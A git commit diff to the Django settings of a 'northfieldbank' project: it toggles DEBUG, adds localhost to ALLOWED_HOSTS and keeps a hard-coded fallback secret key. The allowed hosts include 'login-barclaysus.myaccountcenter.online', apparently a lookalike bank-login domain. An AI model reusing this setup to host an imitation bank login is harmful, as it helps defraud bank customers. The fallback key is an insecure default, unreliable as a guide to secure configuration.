04714a2aeab36acee735b36c26f8a49d31900d80
nenofx8901 <moneywithnenofx@gmail.com>
2025-08-23 13:03:46 +0100

    V4

--- northfieldbank/settings.py
+++ northfieldbank/settings.py
@@ -26,11 +26,11 @@ BASE_DIR = Path(__file__).resolve().parent.parent
 
 # SECURITY WARNING: don't run with debug turned on in production!
 SECRET_KEY = os.environ.get("SECRET_KEY", "dev-secret-key-change-me")  # use env in Render
-DEBUG = os.environ.get("DEBUG", "False").lower() == "true"
 
-ALLOWED_HOSTS = ['login-barclaysus.myaccountcenter.online', 'www.login-barclaysus.myaccountcenter.online', 'bank-education-1.onrender.com']
+
+ALLOWED_HOSTS = ['login-barclaysus.myaccountcenter.online', 'www.login-barclaysus.myaccountcenter.online', 'bank-education-1.onrender.com', 'localhost', '127.0.0.1']
 # ALLOWED_HOSTS = []
-# DEBUG = True
+DEBUG = False
 # Application definition
 
 INSTALLED_APPS = [
